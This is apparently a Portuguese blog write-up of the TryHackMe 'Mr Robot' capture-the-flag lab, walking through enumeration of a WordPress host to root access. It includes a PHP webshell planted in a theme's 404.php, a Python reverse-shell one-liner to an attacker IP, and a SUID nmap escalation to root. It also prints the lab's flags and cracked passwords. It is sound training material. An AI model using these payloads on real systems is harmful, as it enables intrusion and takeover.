---
description: CTF do TryhackME como fiz e anotações.
title: TryhackMe - Mr Robot - Fácil
date: 2024-01-20 18:58:00 +/-0300
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme, linux, sudo, wordpress, facil]     # TAG names should always be lowercase
show_image_post: true
---

![Logo](/assets/img/mrrobot.png){: w="100" h="100" .left}


---

# **CTF - Mr Robot**
---
---
## **Enumeração**


### nmap

```shell
─$ sudo nmap -sS -Pn -n --disable-arp-ping --stats-every=7s  10.10.57.1 --min-rate 10000 -oA nmapver -sV -sC -p 22,80,443
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 21:54 -03

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.21 seconds
```
{: .nolineno }
### ffuf

```shell
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.57.1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 900ms]
| URL | http://10.10.57.1/0000
| --> | http://10.10.57.1/0000/
    * FUZZ: 0000

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 988ms]
| URL | http://10.10.57.1/0
| --> | http://10.10.57.1/0/
    * FUZZ: 0

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 781ms]
| URL | http://10.10.57.1/Image
| --> | http://10.10.57.1/Image/
    * FUZZ: Image

[Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 205ms]
| URL | http://10.10.57.1/admin
| --> | http://10.10.57.1/admin/
    * FUZZ: admin

[Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 218ms]
| URL | http://10.10.57.1/audio
| --> | http://10.10.57.1/audio/
    * FUZZ: audio

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4651ms]
| URL | http://10.10.57.1/atom
| --> | http://10.10.57.1/feed/atom/
    * FUZZ: atom

[Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 216ms]
| URL | http://10.10.57.1/blog
| --> | http://10.10.57.1/blog/
    * FUZZ: blog

[Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 218ms]
| URL | http://10.10.57.1/css
| --> | http://10.10.57.1/css/
    * FUZZ: css

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 757ms]
| URL | http://10.10.57.1/favicon.ico
    * FUZZ: favicon.ico

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 795ms]
| URL | http://10.10.57.1/feed
| --> | http://10.10.57.1/feed/
    * FUZZ: feed

[Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 225ms]
| URL | http://10.10.57.1/images
| --> | http://10.10.57.1/images/
    * FUZZ: images

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4481ms]
| URL | http://10.10.57.1/image
| --> | http://10.10.57.1/image/
    * FUZZ: image

[Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 239ms]
| URL | http://10.10.57.1/intro
    * FUZZ: intro

[Status: 301, Size: 229, Words: 14, Lines: 8, Duration: 237ms]
| URL | http://10.10.57.1/js
| --> | http://10.10.57.1/js/
    * FUZZ: js

[Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 300ms]
| URL | http://10.10.57.1/license
    * FUZZ: license

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4992ms]
| URL | http://10.10.57.1/page1
| --> | http://10.10.57.1/
    * FUZZ: page1

[Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 212ms]
| URL | http://10.10.57.1/readme
    * FUZZ: readme

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 803ms]
| URL | http://10.10.57.1/rdf
| --> | http://10.10.57.1/feed/rdf/
    * FUZZ: rdf

[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 206ms]
| URL | http://10.10.57.1/robots
    * FUZZ: robots

[Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 211ms]
| URL | http://10.10.57.1/robots.txt
    * FUZZ: robots.txt

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 802ms]
| URL | http://10.10.57.1/rss
| --> | http://10.10.57.1/feed/
    * FUZZ: rss

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 804ms]
| URL | http://10.10.57.1/rss2
| --> | http://10.10.57.1/feed/
    * FUZZ: rss2

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 219ms]
| URL | http://10.10.57.1/sitemap
    * FUZZ: sitemap

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 219ms]
| URL | http://10.10.57.1/sitemap.xml
    * FUZZ: sitemap.xml

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 794ms]
| URL | http://10.10.57.1/transmissio  
| --> | http://10.10.57.1/transmissio
    * FUZZ: transmissio  

[Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 207ms]
| URL | http://10.10.57.1/video
| --> | http://10.10.57.1/video/
    * FUZZ: video

[Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 212ms]
| URL | http://10.10.57.1/wp-admin
| --> | http://10.10.57.1/wp-admin/
    * FUZZ: wp-admin

[Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 245ms]
| URL | http://10.10.57.1/wp-content
| --> | http://10.10.57.1/wp-content/
    * FUZZ: wp-content

[Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 218ms]
| URL | http://10.10.57.1/wp-includes
| --> | http://10.10.57.1/wp-includes/
    * FUZZ: wp-includes

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4346ms]
| URL | http://10.10.57.1/wp-config
    * FUZZ: wp-config

[Status: 200, Size: 2621, Words: 115, Lines: 53, Duration: 4575ms]
| URL | http://10.10.57.1/wp-login
    * FUZZ: wp-login

:: Progress: [20469/20469] :: Job [1/1] :: 8 req/sec :: Duration: [0:27:11] :: Errors: 200 ::
```
{: .nolineno }
wpscan não deu nada de util.

http://10.10.57.1/robots.txt

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```
{: .nolineno }

### Key 1

![Alt text](/assets/img/mrrobot5.png){: .w-75 .normal}

Feito download do http://10.10.57.1/fsocity.dic é uma wordlist.

Encontrado wordpress em http://10.10.57.1/0000/
pagina de login wordpress em  http://10.10.57.1/wp-login

Testando username elliot  

![login](/assets/img/mrrobot1.png)

A página http://10.10.57.1/license contém algumas informações no código fonte.

![Alt text](/assets/img/mrrobot2-1.png){: .w-75 .normal}
![Alt text](/assets/img/mrrobot2.png){: .w-75 .normal}
![Alt text](/assets/img/mrrobot3.png){: .w-75 .normal}

Tentei usar na pagina de login do wordpress e sem sucesso.

ZWxsaW90OkVSMjgtMDY1Mgo=

Suspeitei que era encode base 64 e tentei o comando abaixo:
![Alt text](/assets/img/mrrobot4.png)

elliot:ER28-0652

Logado com sucesso no wordpress.

## **Acesso**

Após logar no wordpress vamos editar a pagina 404.php adicionando 

`echo shell_exec($_GET["cmd"]);`

para ter uma webshell na pagina 404.php

![Alt text](/assets/img/mrrobot6.png)

Depois de salvar a pagina acima basta acessar: http://10.10.57.1/wp-content/themes/twentyfifteen/404.php?cmd=id
Se funcionou qualquer comando será listado na pagina como abaixo.
![Alt text](/assets/img/mrrobot7.png)

Recebemos nossa reverse shell apos executar o comando abaixo via webshell

```python
export RHOST="10.6.125.125";export RPORT=4443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
{: .nolineno }

## **Exploração**

na /home tem o usuário robot

```shell
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat pas	
cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Temos essa hash que coloquei no john seguindo o format que esta no nome do arquivo

![Alt text](/assets/img/mrrobot8.png)

## **Escalação de Privilégio**
### Escalando para robot e key 2

```shell
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ 
robot@linux:~$ cat ke	
cat key-2-of-3.txt 
822c73956184f694993bede3eb39f959
robot@linux:~$ 
```
{: .nolineno }

### Escalando para root

Não temos sudo

```shell
robot@linux:/usr/local/bin$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```
{: .nolineno }

Vamos buscar por binários SUID

```shell
robot@linux:/usr/local/bin$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
{: .nolineno }

Usei tbm o suid3num.py que ajuda ja saber qual binário usar
![Alt text](/assets/img/mrrobot9.png)

Tentei seguir essa instrução da print acima, mas não funcionou, então usei a básica do nmap

```shell
robot@linux:/tmp$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# 
```
{: .nolineno }

### Key 3

```shell
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key	
cat key	
cat: key: No such file or directory
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
{: .nolineno }


Pesquisando sobre, a wordlist no final era pra se usar pra bruteforce, um método alternativo, la contem o usuário elliot e a senha, o arquivo tbm possui diversas entradas duplicadas,
que podem ser removidas com  
`└─$ sort fsocity.dic | uniq >fso.txt`  
![Alt text](/assets/img/mrrobot10.png)